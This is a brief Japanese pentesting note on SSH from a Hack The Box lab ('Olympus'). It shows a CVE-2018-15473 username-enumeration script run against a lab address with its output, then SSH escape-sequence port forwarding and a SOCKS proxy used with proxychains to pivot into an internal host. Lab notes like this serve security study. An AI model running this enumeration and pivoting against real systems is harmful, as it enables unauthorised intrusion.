# SSH

----

## user enum
* [CVE-2018-15473](https://github.com/epi052/cve-2018-15473)でユーザの列挙可能
* Htb; Olympus

  ```console
  ┌─[rio@parrot]─[~/Htb/Olympus/cve-2018-15473]
  └──╼ $./ssh-username-enum.py  -p 2222 -w names.txt 10.129.203.13
  [!] Attempted OpenSSH version detection; version not recognized.
  [!] Found: SSH-2.0-City of olympia
  
  [+] icarus found!
  ```

## tips
* ssh console上でEnterKey + ~Cでポートフォワーディングが可能
* Dオプションでsocksプロキシが可能

  ```console
  ------------------TARGET-------------------------
  icarus@620b296204a3:~$
  icarus@620b296204a3:~$
  ssh> -D 8080
  Forwarding port.
  
  ------------------HOST-------------------------
  icarus@620b296204a3:~$
  ┌─[rio@parrot]─[~/Htb/Olympus]
  └──╼ $tail  /etc/proxychains.conf
  #       proxy types: http, socks4, socks5
  #        ( auth types supported: "basic"-http  "user/pass"-socks )
  #
  [ProxyList]
  # add proxy here ...
  # meanwile
  # defaults set to "tor"
  # socks4        127.0.0.1 9050
  socks4  127.0.0.1 8080
  
  ┌─[✗]─[rio@parrot]─[~/Htb/Olympus]
  └──╼ $proxychains ssh  hades@172.19.0.2
  ProxyChains-3.1 (http://proxychains.sf.net)
  |S-chain|-<>-127.0.0.1:8080-<><>-172.19.0.2:22-<--timeout
  |S-chain|-<>-127.0.0.1:8080-<><>-4.2.2.2:53-<><>-OK
  The authenticity of host '172.19.0.2 (172.19.0.2)' can't be established.
  ECDSA key fingerprint is SHA256:uyZtmsYFq/Ac58+SEgLsL+NK05LlH2qwp2EXB1DxlO4.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '172.19.0.2' (ECDSA) to the list of known hosts.
  hades@172.19.0.2's password:
  ```

  

